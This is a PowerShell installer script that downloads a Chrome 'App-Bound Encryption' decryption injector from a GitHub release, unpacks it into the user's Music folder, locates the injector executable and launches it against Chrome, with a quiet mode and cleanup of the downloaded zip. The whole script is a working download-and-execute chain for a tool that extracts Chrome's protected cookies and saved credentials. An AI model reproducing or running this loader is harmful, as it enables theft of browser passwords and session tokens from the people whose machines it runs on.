#Requires -Version 5.1
<#
.SYNOPSIS
    Efficient Chrome App-Bound Encryption Decryption Tool Installer
.DESCRIPTION
    Downloads, installs, and runs Chrome decryption tools with optimized performance and error handling
#>

[CmdletBinding()]
param(
    [switch]$SkipDownload,
    [switch]$Quiet
)

# Configuration
$ErrorActionPreference = "Stop"
$ProgressPreference = if ($Quiet) { "SilentlyContinue" } else { "Continue" }

# Constants
$URL = "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.14.0/chrome-injector-v0.14.0.zip"
$EXTRACT_PATH = "$env:USERPROFILE\Music\chrome_decryptor"
$ZIP_PATH = "$env:TEMP\chrome_decryptor_$(Get-Random).zip"
# This will be updated after extraction based on actual files
$INJECTOR_EXE = ""

function Write-Status {
    param([string]$Message)
    if (-not $Quiet) { Write-Host "[OK] $Message" -ForegroundColor Green }
}

function Test-ChromeRunning {
    return (Get-Process -Name "chrome" -ErrorAction SilentlyContinue) -ne $null
}

function Test-ToolsExist {
    return (Test-Path $INJECTOR_EXE)
}

try {
    # Ensure TLS 1.2 for secure downloads
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    # Check if tools already exist and skip download if requested
    if ($SkipDownload -and (Test-ToolsExist)) {
        Write-Status "Tools already exist, skipping download"
    } else {
        # Warn if Chrome is running
        if (Test-ChromeRunning) {
            Write-Warning "Chrome is currently running. Consider closing it for better results."
        }

        Write-Status "Downloading Chrome decryption tools..."

        # Create extraction directory efficiently
        $null = New-Item -ItemType Directory -Path $EXTRACT_PATH -Force

        # Download with progress and better error handling
        $webClient = New-Object System.Net.WebClient
        try {
            $webClient.DownloadFile($URL, $ZIP_PATH)
            Write-Status "Download completed"
        } finally {
            $webClient.Dispose()
        }

        # Verify download
        if (-not (Test-Path $ZIP_PATH) -or (Get-Item $ZIP_PATH).Length -eq 0) {
            throw "Download failed or file is empty"
        }

        Write-Status "Extracting tools..."

        # Extract with overwrite
        Expand-Archive -Path $ZIP_PATH -DestinationPath $EXTRACT_PATH -Force

        # Debug: List extracted files
        Write-Status "Checking extracted files..."
        $extractedFiles = Get-ChildItem -Path $EXTRACT_PATH -Recurse -File
        if ($extractedFiles) {
            Write-Host "Found files:" -ForegroundColor Yellow
            $extractedFiles | ForEach-Object { Write-Host "  $($_.FullName)" -ForegroundColor Gray }
        } else {
            Write-Host "No files found in extraction directory!" -ForegroundColor Red
        }

        # Find the injector executable
        $allFiles = Get-ChildItem -Path $EXTRACT_PATH -Recurse -File
        $injectorFile = $allFiles | Where-Object { $_.Name -like "*inject*.exe" } | Select-Object -First 1

        if ($injectorFile) {
            $script:INJECTOR_EXE = $injectorFile.FullName
            Write-Status "Found injector: $($injectorFile.Name)"
        }

        # Verify extraction - we only need the injector
        if (-not $injectorFile) {
            Write-Host "Available files:" -ForegroundColor Yellow
            $allFiles | ForEach-Object { Write-Host "  $($_.Name)" -ForegroundColor Gray }
            throw "Extraction failed - chrome injector executable not found."
        }

        Write-Status "Extraction completed"
    }

    Write-Status "Running Chrome injector..."

    # Run injector with chrome argument
    $injectorProcess = Start-Process -FilePath $INJECTOR_EXE -ArgumentList "chrome" -PassThru

    Write-Status "Tools launched successfully"
    Write-Host "`nTools location: $EXTRACT_PATH" -ForegroundColor Cyan

} catch {
    Write-Error "Error: $($_.Exception.Message)"
    exit 1
} finally {
    # Cleanup temporary files
    if (Test-Path $ZIP_PATH) {
        Remove-Item $ZIP_PATH -Force -ErrorAction SilentlyContinue
    }
}
